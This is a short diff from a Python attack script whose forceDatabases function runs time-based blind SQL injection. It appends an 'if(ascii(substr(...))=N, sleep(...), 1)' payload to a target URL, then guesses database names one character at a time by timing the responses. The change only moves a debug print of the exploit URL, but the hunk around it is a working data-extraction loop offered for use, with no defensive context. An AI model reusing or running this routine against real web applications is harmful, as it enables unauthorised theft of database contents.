@@ -37,8 +37,8 @@ def forceDatabases(pocUrl):
             payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
             for index in range(1,databaseConcatLength+1):
                 for char in sqlForce:
-                    # print(expUrl)
                     expUrl = pocUrl + payload.format(str(index), ord(char), str(sleepTime))
+                    print(expUrl)
                     startTime = time()
                     res = get(expUrl)
                     endTime = time()
